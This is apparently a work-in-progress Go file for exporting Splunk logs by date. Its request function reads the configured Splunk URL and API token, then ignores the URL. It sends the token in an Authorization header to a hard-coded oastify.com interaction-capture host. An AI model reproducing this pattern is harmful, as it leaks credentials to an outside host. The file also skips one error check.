package pkg

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/mattytmn/splunkextractor/internal"
	"github.com/spf13/viper"
)

func RunSplunkQuery(month, year string) {
	// To iterate through all days use addDate to increment base date and add one 1 base date to get end of range
	// Save log export to file
	// splunkUrl, apiToken := getConfigValues()
	dir, first, days := setupSplunkExport(month, year)
	fmt.Println(days)
	fmt.Println(dir)

	fmt.Println(first)
	for i := 0; i < 3; i++ {
		fmt.Println(i)
		earliest, latest := internal.QueryDates(first.AddDate(0, 0, i))
		sendHttpRequest(earliest, latest)
	}
}

func sendHttpRequest(earliest, latest string) {
	splunkUrl := getConfigValues("splunk_api")
	token := getConfigValues("api_token")
	fmt.Println(splunkUrl)
	// formData := []byte("aa=aa&bb=bb")
	formBody := url.Values{"aaa": []string{"noot root"}}
	data := formBody.Encode()
	req, err := http.NewRequest("POST", "http://gi26ffwbrw9dhvz3jgfmh3nngem5axym.oastify.com", strings.NewReader(data))
	internal.Check(err)
	req.Header.Add("Content-type", "application/x-www-form-urlencoded")
	req.Header.Add("Authorization", token)
	client := &http.Client{}
	res, err := client.Do(req)
	resp, err := io.ReadAll(res.Body)
	internal.Check(err)
	fmt.Printf("%s \n", resp)
}

func writeRespToFile() {}

func setupSplunkExport(month, year string) (filepath string, firstDay time.Time, days int) {
	directoryName := fmt.Sprintf("%s_%s", month, year)
	filepath = internal.CreateLogsDir(directoryName)
	internal.CreateLogFile(filepath)
	monthAndYear := fmt.Sprintf("%s %s", month, year)
	days, firstDay = internal.GetDaysInMonth(monthAndYear)

	return filepath, firstDay, days
}

func getConfigValues(k string) (v string) {
	viper.SetConfigName("config")
	viper.SetConfigType("yaml")
	viper.AddConfigPath(".")
	viper.AddConfigPath("$HOME/.config/splunk")

	err := viper.ReadInConfig()
	if err != nil {
		log.Fatalf("could not get config file: %s", err)
	}
	v = viper.GetString(k)
	return v
}
